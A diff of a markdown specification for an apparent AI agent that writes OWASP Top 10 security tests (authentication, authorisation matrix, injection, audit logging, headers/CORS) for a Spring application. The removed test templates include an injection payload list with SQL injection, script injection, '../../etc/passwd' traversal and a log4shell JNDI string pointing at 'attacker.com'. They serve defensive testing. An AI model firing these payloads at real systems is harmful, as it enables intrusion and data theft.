@@ -37,6 +37,23 @@ Do NOT use this agent for: dependency CVE scanning (use `dependency-security-ana
 
 ---
 
+## Reference docs
+
+This agent's test-class skeletons, OWASP coverage policy, ZAP automation,
+and output document template live in
+`claude-catalog/docs/tobe-testing/security-test-writer/` and are read on
+demand. Read each doc only when the matching block of work starts — not
+preemptively.
+
+| Doc | Read when |
+|---|---|
+| `test-templates.md`     | authoring `AuthenticationFlowTest`, the role × endpoint authorisation matrix, the A03 injection battery, A09 audit-log assertions, or the headers/CORS class |
+| `owasp-matrix.md`       | planning the OWASP Top 10 coverage and the Phase 2 SEC-NN regression cross-reference |
+| `zap-baseline.md`       | the user opted in to ZAP automation and you need to emit `zap/zap-baseline.sh` |
+| `output-doc-template.md`| authoring the consolidated `05-security-findings.md` document and the final terminal output |
+
+---
+
 ## Inputs (passed by supervisor)
 
 - `repo_root` — absolute path
@@ -61,6 +78,34 @@ Read Phase 4 hardening to know what the TO-BE security baseline is
 (OAuth2 flow, JWT issuer, scopes, CSP policy, CORS allowlist) — your
 tests verify that the baseline is actually enforced by the running
 code, not just documented in ADRs.
+
+---
+
+## Method
+
+1. Load Phase 2 SEC-NN entries and Phase 4 hardening ADRs. Build the
+   regression-prevention list (every SEC-NN that maps to a TO-BE
+   layer) and the baseline checklist (OAuth2 flow, JWT issuer/scopes,
+   CSP, CORS allowlist, secure headers).
+2. Plan the OWASP Top 10 coverage. Read
+   `claude-catalog/docs/tobe-testing/security-test-writer/owasp-matrix.md`
+   for the per-category approach and decide which categories are
+   non-applicable (and why — must be documented).
+3. Author the per-area test classes. Read
+   `claude-catalog/docs/tobe-testing/security-test-writer/test-templates.md`
+   for skeletons (auth flow, role × endpoint authorisation, A03
+   injection battery, A09 audit log, headers/CORS) and adapt them to
+   the project's resource paths, role names, and payloads.
+4. Cross-reference every Phase 2 SEC-NN: write a regression test that
+   proves the issue is NOT present in TO-BE, or document the
+   non-applicability rationale.
+5. If the user opted in to ZAP, read
+   `claude-catalog/docs/tobe-testing/security-test-writer/zap-baseline.md`
+   and emit `zap/zap-baseline.sh` plus the rule allowlist.
+6. Author the consolidated `05-security-findings.md` document using
+   the template in
+   `claude-catalog/docs/tobe-testing/security-test-writer/output-doc-template.md`.
+7. Print the final terminal output and stop.
 
 ---
 
@@ -90,257 +135,29 @@ e2e/security/
 ├── csp-headers.spec.ts                 (verifies CSP delivered to browser)
 ├── auth-redirect.spec.ts               (unauth → /login redirect)
 └── session-fixation.spec.ts            (post-login session ID rotation)
-
-zap/                                    (optional, only if ZAP available)
-├── zap-baseline.sh                     (runs zap-baseline.py against TOBE_FRONTEND_URL)
-└── .zap/rules.tsv                      (rule ignore-list with justifications)
 ```
 
-And the consolidated report:
+ZAP layout (only when opted in) — see
+`claude-catalog/docs/tobe-testing/security-test-writer/zap-baseline.md`.
 
-```
-docs/analysis/05-tobe-tests/05-security-findings.md
-```
-
-Frontmatter for the report:
-
-```yaml
----
-phase: 5
-sub_step: 5.5
-agent: security-test-writer
-generated: <ISO-8601>
-sources:
-  - docs/analysis/02-technical/08-security/
-  - docs/refactoring/4.7-hardening/
-  - docs/refactoring/api/openapi.yaml
-  - backend/src/main/java/.../security/
-related_ucs: [<UC-NN>, ...]
-confidence: high | medium | low
-status: complete | partial | needs-review | blocked
----
-```
+Consolidated report: `docs/analysis/05-tobe-tests/05-security-findings.md`
+— shape and frontmatter in
+`claude-catalog/docs/tobe-testing/security-test-writer/output-doc-template.md`.
 
 ---
 
-## Test patterns
+## Stop conditions
 
-### Authentication flow
-
-```java
-@SpringBootTest
-@AutoConfigureMockMvc
-class AuthenticationFlowTest {
-
-    @Autowired private MockMvc mockMvc;
-
-    @Test
-    void protectedEndpoint_withoutToken_returns401() throws Exception {
-        mockMvc.perform(get("/v1/<resource>"))
-            .andExpect(status().isUnauthorized());
-    }
-
-    @Test
-    void protectedEndpoint_withExpiredToken_returns401() throws Exception {
-        var expired = jwtFactory.expired();
-        mockMvc.perform(get("/v1/<resource>").header("Authorization", "Bearer " + expired))
-            .andExpect(status().isUnauthorized());
-    }
-
-    @Test
-    void protectedEndpoint_withInvalidSignature_returns401() throws Exception {
-        var tampered = jwtFactory.withTamperedSignature();
-        mockMvc.perform(get("/v1/<resource>").header("Authorization", "Bearer " + tampered))
-            .andExpect(status().isUnauthorized());
-    }
-}
-```
-
-### Authorisation matrix
-
-For each role × each endpoint combination, verify the expected
-allow/deny. Use `@ParameterizedTest` with a CSV source describing
-the matrix:
-
-```java
-@ParameterizedTest
-@CsvSource({
-    "USER,    GET,  /v1/items,         200",
-    "USER,    POST, /v1/items,         201",
-    "USER,    POST, /v1/admin/users,   403",
-    "ADMIN,   POST, /v1/admin/users,   201",
-    "ANONYMOUS, GET, /v1/items,        401"
-})
-void roleEndpointMatrix(String role, String method, String path, int expectedStatus) {
-    // ...
-}
-```
-
-### OWASP A03 — Injection
-
-For every endpoint that accepts string input, fire a battery of
-injection payloads and verify the response is either 400 (validation
-rejection) or 200 with sanitised output:
-
-```java
-@ParameterizedTest
-@ValueSource(strings = {
-    "'; DROP TABLE users; --",
-    "1' OR '1'='1",
-    "<script>alert(1)</script>",
-    "../../etc/passwd",
-    "${jndi:ldap://attacker.com/x}",  // log4shell
-})
-void injectionPayloads_areSafelyHandled(String payload) throws Exception {
-    mockMvc.perform(
-            post("/v1/<resource>")
-                .contentType(MediaType.APPLICATION_JSON)
-                .content("{\"name\":\"" + payload + "\"}"))
-        .andExpect(status().isIn(400, 422));  // validation rejection
-}
-```
-
-### OWASP A09 — Logging & monitoring
-
-Verify that critical operations produce audit logs with correlation
-IDs and that the log shape matches the JSON schema established by
-Phase 4 hardening:
-
-```java
-@Test
-void criticalOperation_emitsAuditLog() {
-    var listAppender = attachListAppender(AuditLogger.class);
-
-    service.deleteCustomer(customerId);
-
-    var entries = listAppender.list;
-    assertThat(entries).anyMatch(e ->
-        e.getMessage().contains("customer.deleted") &&
-        e.getMDCPropertyMap().containsKey("correlationId") &&
-        e.getMDCPropertyMap().containsKey("userId"));
-}
-```
-
-### Headers & CORS
-
-```java
-@Test
-void responseHeaders_includeOwaspBaseline() throws Exception {
-    mockMvc.perform(get("/v1/<resource>").header("Authorization", validToken()))
-        .andExpect(header().string("X-Content-Type-Options", "nosniff"))
-        .andExpect(header().string("X-Frame-Options", "DENY"))
-        .andExpect(header().string("Strict-Transport-Security", containsString("max-age=")))
-        .andExpect(header().exists("Content-Security-Policy"));
-}
-
-@Test
-void cors_allowsOnlyConfiguredOrigins() throws Exception {
-    mockMvc.perform(
-            options("/v1/<resource>")
-                .header("Origin", "https://evil.com")
-                .header("Access-Control-Request-Method", "POST"))
-        .andExpect(status().isForbidden());
-}
-```
-
----
-
-## OWASP Top 10 — coverage policy
-
-Every category gets a dedicated test class. Categories that don't
-apply to the project (rare) get an explicit non-applicability
-documentation in `05-security-findings.md` with rationale.
-
-| Category | Approach |
-|---|---|
-| A01 Broken Access Control | Authorisation matrix above |
-| A02 Cryptographic Failures | Verify HTTPS-only redirect, strong TLS ciphers (config check), password hashing (BCrypt + min cost factor) |
-| A03 Injection | Payload battery on each string-input endpoint |
-| A04 Insecure Design | Rate-limit verification, account lockout, idempotency on writes |
-| A05 Security Misconfiguration | Actuator access, default credentials check, error verbosity (no stack traces in responses) |
-| A06 Vulnerable & Outdated Components | OWASP Dependency-Check Maven plugin verification (CVSS gate) |
-| A07 Identification & Authentication Failures | Session fixation, password reset flow, MFA (if applicable) |
-| A08 Software & Data Integrity Failures | Verify deserialisation safety, SBOM presence, signed artifacts |
-| A09 Security Logging & Monitoring | Audit log emission tests above |
-| A10 SSRF | Outbound HTTP to user-supplied URLs is rejected unless allowlist |
-
----
-
-## Phase 2 cross-reference (regression prevention)
-
-Read every SEC-NN entry from
-`docs/analysis/02-technical/08-security/security-findings.md`. For
-each:
-1. Identify whether it applied to a layer that exists in TO-BE.
-2. Write a regression test that proves the issue is NOT present in
-   TO-BE.
-3. Reference the SEC-NN explicitly in the test's javadoc / comment.
-
-If a Phase 2 finding cannot be tested in TO-BE because the affected
-component doesn't exist anymore (e.g., Streamlit-specific cache leak):
-document the rationale in `05-security-findings.md` under
-`## Phase 2 findings — TO-BE applicability`.
-
----
-
-## ZAP baseline scan (optional)
-
-If `zap-baseline.py` is available in the env (Docker is fine: image
-`owasp/zap2docker-stable`), produce `zap/zap-baseline.sh`:
-
-```bash
-#!/usr/bin/env bash
-set -euo pipefail
-TARGET="${TOBE_FRONTEND_URL:-http://localhost:4200}"
-docker run --rm -v "$(pwd)/zap:/zap/wrk" \
-    -t owasp/zap2docker-stable zap-baseline.py \
-    -t "${TARGET}" -r zap-baseline-report.html \
-    -c rules.tsv
-```
-
-Document expected scan duration and run instructions in the report.
-The supervisor will not run the scan automatically — it's an opt-in
-gate for the user.
-
----
-
-## `05-security-findings.md` structure
-
-```markdown
----
-<frontmatter>
----
-
-# Security findings — TO-BE Phase 5
-
-## Summary
-- OWASP Top 10 coverage: 10/10
-- Phase 2 regressions tested: <N> / <total>
-- Open findings: critical=<N>, high=<N>, medium=<N>, low=<N>
-
-## OWASP Top 10 coverage
-| Category | Test class | Status |
-|---|---|---|
-| A01 Broken Access Control | A01_BrokenAccessControlTest | complete |
-| ... | ... | ... |
-
-## Phase 2 regression matrix
-| AS-IS finding | Status in TO-BE | Test reference |
-|---|---|---|
-| SEC-001 | mitigated | A03_InjectionTest#test_payloadX |
-| SEC-002 | not-applicable | n/a (Streamlit-only) |
-| ... | ... | ... |
-
-## Open findings
-### SEC-NN: <title>
-<as per item-frontmatter shape from supervisor spec>
-
-## ZAP baseline (optional)
-<Run instructions; latest scan summary if executed>
-
-## Open questions
-<list>
-```
+- **Stop and ask the user** if Phase 2 security findings or Phase 4
+  hardening artefacts are missing or empty — without them you cannot
+  build the regression list or the baseline checklist.
+- **Stop and ask the user** if an OWASP category is being marked
+  non-applicable but the rationale is not unambiguous from the
+  artefacts (e.g., A10 SSRF in a system that does call external
+  URLs).
+- **Stop** before opting in to a live ZAP scan against any URL — the
+  scan is opt-in and never run automatically.
+- Otherwise continue and finalise the consolidated report.
 
 ---
 
@@ -360,21 +177,3 @@ gate for the user.
   to a given endpoint because it has no string input, say so
   explicitly — don't silently skip.
 - **Idempotent tests.** No leftover state.
-
----
-
-## Final report
-
-```
-Security tests authored.
-OWASP categories covered:    10 / 10 (any non-applicable explicitly documented)
-Phase 2 regressions tested:  <N> / <total>
-Authentication tests:        <count>
-Authorisation matrix size:   <roles × endpoints>
-ZAP scan:                    configured | not-configured
-Open findings (critical):    <count>
-Open findings (high):        <count>
-Open questions:              <count>
-Confidence:                  high | medium | low
-Status:                      complete | partial | needs-review | blocked
-```
